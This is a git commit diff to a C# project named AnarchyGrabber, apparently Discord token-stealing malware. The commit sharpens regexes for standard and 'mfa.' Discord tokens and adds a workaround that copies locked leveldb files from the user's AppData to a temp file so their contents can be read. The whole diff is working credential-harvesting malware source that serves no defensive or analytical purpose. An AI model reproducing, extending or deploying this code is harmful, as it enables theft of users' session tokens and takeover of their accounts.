569190ef4d428c4bba3d5d89fa43a896ee3cef65
Zert3x <zertex@protonmail.com>
2019-08-16 13:20:23 -0400

    Better regex + new token type
    more precise regex and regex for mfa. style tokens

--- AnarchyGrabber/Grabber.cs
+++ AnarchyGrabber/Grabber.cs
@@ -13,24 +13,51 @@ namespace AnarchyGrabber
 
         public static List<string> GetTokens(string dir, bool checkLogs = false)
         {
-            DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+            var leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
                                                       + @"\AppData\"
                                                       + dir
                                                       + @"\Local Storage\leveldb");
 
 
-            List<string> tokens = new List<string>();
-
+            var tokens = new List<string>();
+            var _r = new Regex(@"[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}");
+            var __r = new Regex(@"mfa\.[a-zA-Z0-9_-]{84}");
             try
             {
                 foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
                 {
+                    string str = "";
                     //looks for discord token patterns (yes my regex is shit shut up)
-                    foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]"))
-                        tokens.Add(match.Value);
+                    try
+                    {
+
+                        var a = file.Open(FileMode.Open, FileAccess.Read);
+                        var sr = new StreamReader(a);
+                        str = sr.ReadToEnd();
+
+                    }
+                    catch
+                    {
+                        if (File.Exists("temp.txt"))
+                            File.Delete("temp.txt");
+                        File.Copy(file.FullName, "temp.txt");
+                        var a = File.OpenRead("temp.txt");
+                        var sr = new StreamReader(a);
+                        str = sr.ReadToEnd();
+                        a.Close();
+                        File.Delete("temp.txt");
+
+                    }
+                    var m = _r.Match(str);
+                    var m1 = __r.Match(str);
+                    if (m.Success)
+                        tokens.Add(m.Value);
+                    if (m1.Success)
+                        tokens.Add(m1.Value);
                 }
             }
             catch { }
+
 
             tokens = tokens.Distinct().ToList();
 
